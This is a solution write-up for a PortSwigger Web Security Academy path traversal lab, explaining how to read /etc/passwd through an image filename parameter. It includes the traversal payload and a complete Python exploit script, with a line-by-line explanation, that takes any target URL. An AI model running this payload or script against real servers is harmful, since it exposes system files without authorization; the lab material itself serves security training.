# File path traversal, simple case

https://portswigger.net/web-security/file-path-traversal/lab-simple

This lab contains a path traversal vulnerability in the display of product images.
To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Solution

To solve this, we must find a way to get into the folder `/etc/passwd`. We can do this using path traversal.
Lets check one of the url of the images in the webpage.

```
https://0a5700da038af37982ad984100db00b2.web-security-academy.net/image?filename=16.jpg
```

From here we can just edit the file name to go to our desired folder.
Often the files for web servers are located in `/var/www/html` and in this case it could be inside a folder `/images` but we don't know for sure. 
What we can do is move up the folder a couple of times to make sure that when we include the path to our `passwd` file, we are in the root directory. 

```
https://0a5700da038af37982ad984100db00b2.web-security-academy.net/image?filename=../../../../etc/passwd
```

And with this we have solved the lab!

Python script to automate:

```python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    image_url = url +'/image?filename=../../../../etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)

if __name__ == "__main__":
    main()
```

  
This Python script is designed to exploit a directory traversal vulnerability in a web application. Directory traversal is a type of attack that allows an attacker to access directories and files that are outside the intended directory.

Let's break down the code step by step:

**Imports**:

```python
import sys 
import requests 
import urllib3
```

- `sys`: Provides access to some variables used or maintained by the interpreter and to functions that interact with the interpreter.
- `requests`: A popular Python library for making HTTP requests.
- `urllib3`: A powerful library for handling HTTP requests in Python.

**Disable Warnings**:

```python
`urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`
```

This disables the warnings related to insecure requests. It's commonly used to suppress warnings when making requests to sites with invalid or self-signed SSL certificates.

**Proxies Configuration**:

```python
`proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}`
```

This sets up proxy settings. The script is configured to use a proxy server running on `127.0.0.1` at port `8080` for both HTTP and HTTPS requests. This is useful for intercepting and inspecting the traffic using tools like Burp Suite.

**directory_traversal_exploit Function**:

```python
def directory_traversal_exploit(url):
    image_url = url +'/image?filename=../../../../etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('(+) Exploit successful!')
        print('(+) The following is the content of the /etc/passwd file:')
        print(r.text)
    else:
        print('(-) Exploit failed.')
        sys.exit(-1)
```

- This function constructs a URL that attempts to access the `/etc/passwd` file on the target system by exploiting the directory traversal vulnerability.
- It sends an HTTP GET request to this URL using the `requests.get()` method.
- If the response text contains 'root:x', it indicates that the exploit was successful, and the content of the `/etc/passwd` file is printed.
- If the exploit fails, it prints a failure message and exits the script.

**main Function**:

```python
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit(url)
```

- This function is the main entry point of the script.
- It checks if the script is provided with exactly one command-line argument (the target URL).
- If the correct number of arguments is not provided, it prints the correct usage of the script and exits.
- It then calls the `directory_traversal_exploit()` function with the provided URL.

**Script Execution**:

```python
if __name__ == "__main__":
    main()
```

This block ensures that the `main()` function is executed when the script is run as the main program.

To use this script, you would run it from the command line, providing the target URL as an argument. For example:

```shell
python3 script_name.py www.target-site.com
```

Replace `script_name.py` with the actual name of the script file.

